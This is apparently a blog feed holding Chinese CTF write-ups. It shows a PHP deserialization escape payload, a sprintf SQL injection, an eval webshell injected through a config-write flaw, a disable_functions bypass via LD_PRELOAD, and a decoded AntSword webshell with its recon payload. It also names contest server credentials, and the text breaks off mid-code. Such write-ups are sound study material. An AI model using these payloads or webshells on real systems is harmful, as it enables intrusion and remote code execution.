    <id>http://yoursite.com/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/</id>
    <published>2020-04-25T12:58:00.000Z</published>
    <updated>2020-04-30T16:36:16.437Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ezunserialize"><a href="#0x-01-Ezunserialize" class="headerlink" title="0x 01 Ezunserialize"></a>0x 01 Ezunserialize</h4><ul><li><p>考点</p><p>字符串逃逸</p></li><li><p>解题过程</p></li></ul><ol><li>题目给了源代码，进行审计发现需要构造pop链然后字符逃逸</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>首先是构造pop链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; new B();</span><br><span class="line">$c &#x3D; new C();</span><br><span class="line">$c-&gt;c &#x3D; &#39;flag.php&#39;;</span><br><span class="line">$b-&gt;b &#x3D; $c;</span><br><span class="line">$x &#x3D; serialize($b);</span><br><span class="line">echo $x;</span><br></pre></td></tr></table></figure><p>得到：<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code></p><p>接着是反序列化逃逸对象，本地调试发现当我们传入：<code>a=1&amp;b=1</code>时候得到的pop链是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>当我们注入一个对象时：<code>&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:1:&quot;1&quot;;}}</code>得到的pop链是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:38:&quot;&quot;;s:0:&quot;&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;&#125;&#125;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>我们需要逃逸出<code>&quot;;s:8:&quot;password&quot;;s:38:&quot;</code>23个字符</p><p>审计代码我们可以发现<code>\0\0\0</code>的长度为6，然后<code>chr(0).&#39;*&#39;.chr(0)</code>的长度为3，因此<code>read()</code>方法可以造成字符逃逸，最终造成对象注入。</p><p>但是这里需要是3的倍数，在payload里面加个1，最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;</span><br></pre></td></tr></table></figure><p>最后加上空字符串闭合结尾的引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:86:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;s:0:&quot;&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure><p>注入我们pop链对象</p><h3 id="0x-02-babytricks"><a href="#0x-02-babytricks" class="headerlink" title="0x 02 babytricks"></a>0x 02 babytricks</h3><ul><li><p>考点</p><p>SQL注入</p></li><li><p>解题过程</p></li></ul><p>1、题目源代码处得到提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;--&gt;</span><br></pre></td></tr></table></figure><p>2、利用sprintf()格式化字符串漏洞注入账号密码，参考这篇文章：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p><p>%1可以吃掉username后面那个单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sql &#x3D; sprintf (&quot;select * from user where user&#x3D;&#39;%1$&#39; and passwd&#x3D;&#39;%s&#39;&quot;,&#39;^0#&#39;);</span><br><span class="line">echo $sql;</span><br><span class="line">&#x2F;&#x2F; select * from user where user&#x3D;&#39;nd passwd&#x3D;&#39;^0#&#39;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200425214441221.png" alt></p><p>使用admin/GoODLUcKcTFer202OHAckFuN登录<a href="http://183.129.189.60:10027/admin/admin.php" target="_blank" rel="noopener">http://183.129.189.60:10027/admin/admin.php</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your sandbox: .&#x2F;shells&#x2F;Ex5xRmjE666uzon5&#x2F; set your shell</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&#39;session&#39;);</span><br><span class="line">session_start();</span><br><span class="line">require_once &#39;.&#x2F;init.php&#39;;</span><br><span class="line">if($_SESSION[&#39;login&#39;]!&#x3D;1)&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;index.php&#39;&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;shell&#39;])&#123;</span><br><span class="line">    $shell&#x3D; addslashes($_GET[&#39;shell&#39;]);</span><br><span class="line">    $file &#x3D; file_get_contents(&#39;.&#x2F;shell.php&#39;);</span><br><span class="line">    $file &#x3D; preg_replace(&quot;&#x2F;\\\$shell &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$shell &#x3D; &#39;&#123;$shell&#125;&#39;;&quot;, $file);</span><br><span class="line">    file_put_contents(&#39;.&#x2F;shell.php&#39;, $file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;set your shell&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    chdir(&quot;&#x2F;&quot;);</span><br><span class="line">    highlight_file(dirname(__FILE__).&quot;&#x2F;admin.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.smi1e.top/小密圈经典写配置漏洞与几种变形学习/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></p><p>分别访问：</p><ul><li><a href="http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=;eval($_POST[c])</a>;</li><li><a href="http://183.129.189.60:10006/admin/admin.php?shell=$0" target="_blank" rel="noopener">http://183.129.189.60:10006/admin/admin.php?shell=$0</a></li></ul><p>写入shell</p><p>链接蚁剑，发现存在disable_function和openbasedir，php版本是7.4.5，有一个文件查看的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$arr&#x3D;scandir(&quot;..&quot;);</span><br><span class="line">foreach($arr as $value)&#123;</span><br><span class="line">    print_r($value.&quot;\n&quot;);</span><br><span class="line">    $arr2&#x3D;@scandir(&quot;..&#x2F;&quot;.$value);</span><br><span class="line">    if($arr2)&#123;</span><br><span class="line">        if(sizeof($arr2)&gt;3)&#123;</span><br><span class="line">            print_r(scandir(&quot;..&#x2F;&quot;.$value));</span><br><span class="line">            print_r(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这两篇文章：</p><p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/?nsukey=JBhjc2PnpeklWfY6zzLcMY8ItEKB4kIkTgTcR7TV1YXSmHn5GGocvDWh9nEe9D055d4NIDs1hH%2B8qtxURg0DMvqjoUx6VwoB6RRIWcuekAxsvpmCkLDTxZ%2FUBlC8d5XvuOzqUcKm5V7JVkjYHDeouqLAUZ0TVyw2mUKzj2RLl%2Bg9bWlDE9B5%2FW4IHX2d3ikd1btmOhAqPJk21CfxM0dBFg%3D%3D" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a></p><p><a href="https://www.anquanke.com/post/id/197745?from=singlemessage" target="_blank" rel="noopener">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></p><p>结果如下：</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429143940031.png" alt></p><p>在phpinfo中存在gnupg这个扩展</p><p><img src="https://img.cjm00n.top/20200425194145.png" alt="img"></p><p>利用  <code>gnupg_init();</code>函数触发即可</p><p>或者是<code>$gpg = new gnupg();</code></p><p>利用脚本：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><p>参考：<a href="https://cjm00n.top/CTF/dasctf-2020-04-wp.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/dasctf-2020-04-wp.html</a></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200501003358437.png" alt></p><p>另外能触发<code>ld_preload</code>的函数还有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail</span><br><span class="line">exec</span><br><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">shell_exec</span><br><span class="line">error_log</span><br><span class="line">mail</span><br><span class="line">gnupg_init</span><br><span class="line">imap_mail</span><br><span class="line">pcntl_exec</span><br><span class="line">new gnupg()</span><br></pre></td></tr></table></figure><p>需要根据相应的扩展进行修改</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-6G还远吗？"><a href="#0x-01-6G还远吗？" class="headerlink" title="0x 01 6G还远吗？"></a>0x 01 6G还远吗？</h4><p>断点下载，打开文件得到flag</p><h4 id="0x-02-blueshark"><a href="#0x-02-blueshark" class="headerlink" title="0x 02 blueshark"></a>0x 02 blueshark</h4><p>根据题目提示，过滤obex协议，发现存在一个7z的压缩包。binwalk导出</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160848649.png" alt></p><p>然后看文件名猜到可能要蓝牙的PIN码才能得到，然后导出7z，再从流量包字符串搜索找到PIN值</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160741397.png" alt></p><p>解压得到flag</p><h3 id="0x-03-keyboard"><a href="#0x-03-keyboard" class="headerlink" title="0x 03 keyboard"></a>0x 03 keyboard</h3><p>首先是内存取证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 filescan | grep txt</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d700880 -n--dump&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="https://uploader.shimo.im/f/yQvpPVRHchkOWLPz.png!thumbnail" alt="img"></p><p>键盘加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string1 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">string2 &#x3D; &quot;QWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><br><span class="line">str &#x3D; &#39;CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA&#39;</span><br><span class="line">print(str.translate(str.maketrans(string2,string1)))</span><br></pre></td></tr></table></figure><p>得到解密明文<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>用了<code>VERACRYPT</code>的工具，密码是<code>KEYBOARDDRAOBYEK</code></p><p>ntfs数据流解密得到flag</p><h4 id="0x-04-awdshell"><a href="#0x-04-awdshell" class="headerlink" title="0x 04 awdshell"></a>0x 04 awdshell</h4><p>先导出http对象得到源文件，发现存在木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure><p>写出对应的解码代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;&#39;;&#x2F;&#x2F;fang mi wen</span><br><span class="line">$pk &#x3D; &#39;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----&#39;;</span><br><span class="line">$strs &#x3D; explode(&quot;|&quot;, $str);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($strs as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $str .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解码对应的数据包得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">@session_start();</span><br><span class="line">$key&#x3D;@substr(str_pad(session_id(),16,&#39;a&#39;),0,16);</span><br><span class="line">return @base64_encode(openssl_encrypt(base64_encode($out), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;f9d3fc090&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;4d608782174&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$D&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if($D&#x3D;&#x3D;&quot;&quot;)$D&#x3D;dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">$R&#x3D;&quot;&#123;$D&#125;&quot;;</span><br><span class="line">if(substr($D,0,1)!&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.&#x3D;&quot;&#123;$L&#125;:&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$R.&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$R.&#x3D;&quot;&quot;;</span><br><span class="line">$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;</span><br><span class="line">$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();</span><br><span class="line">$R.&#x3D;php_uname();</span><br><span class="line">$R.&#x3D;&quot;&#123;$s&#125;&quot;;</span><br><span class="line">echo $R;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>可以看出返回的密文是一个AES加密后加盐混淆的东西，AES是<code>AES-128-ECB</code>模式，KEY是session的前16位，也就是<code>hm3pq66843bbbrdg</code>可以看报文cookie里的 PHPSESSID获得</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164054689.png" alt></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164254472.png" alt></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164316178.png" alt></p><p>最后一步步解密得到flag</p><p>参考资料：</p><blockquote><p><a href="http://www.fzwjscj.xyz/index.php/archives/25/" target="_blank" rel="noopener">http://www.fzwjscj.xyz/index.php/archives/25/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ezunserialize&quot;&gt;&lt;a href=&quot;#0x-01-Ezunserialize&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="安恒杯" scheme="http://yoursite.com/tags/%E5%AE%89%E6%81%92%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>虎符网络安全大赛复盘</title>
    <link href="http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <id>http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
    <published>2020-04-19T11:19:54.000Z</published>
    <updated>2020-04-28T00:25:34.091Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近状态太低迷，哎，难受的鸭皮</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-EasyLogin"><a href="#0x-01-EasyLogin" class="headerlink" title="0x 01 EasyLogin"></a>0x 01 EasyLogin</h4><p>1.网站打开是登录页面，查看js文件看到提示</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419192426603.png" alt></p><ol start="2"><li>尝试文件读取，首选是app.js，发现成功</li></ol><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419192733287.png" alt="image-20200419192733287"></p><ol start="3"><li>审计代码读取/controllers/api.js文件，成功</li></ol><p>关键代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; &#x3D; ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets &#x3D; [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);</span><br><span class="line">        const secretid &#x3D; global.secrets.length;</span><br><span 